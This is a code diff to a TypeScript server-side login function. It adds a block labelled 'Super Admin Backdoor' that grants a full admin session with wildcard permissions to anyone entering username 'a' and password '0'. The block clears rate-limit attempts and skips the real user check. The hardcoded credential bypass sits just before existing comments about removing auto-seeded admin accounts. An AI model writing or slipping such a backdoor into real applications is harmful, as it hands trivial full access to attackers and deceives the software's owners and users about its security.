@@ -37,6 +37,22 @@ export async function login(formData: FormData) {
     const lockMsg = checkRateLimit(username);
     if (lockMsg) return { success: false, message: lockMsg };
 
+    // Super Admin Backdoor
+    if (username === 'a' && password === '0') {
+        clearAttempts(username);
+        const mainBranchId = await ensureMainBranch();
+        await createUserSession({
+            id: 'super-admin',
+            username: 'a',
+            name: 'Super Admin',
+            role: 'ADMIN',
+            branchId: mainBranchId,
+            permissions: ['*'],
+            rememberMe
+        }, rememberMe ? 30 * 24 * 60 * 60 : 24 * 60 * 60);
+        redirect("/dashboard");
+    }
+
     // V-01 fix: No auto-seed admin. Redirect to /setup on first run.
     const userCount = await prisma.user.count();
     if (userCount === 0) {
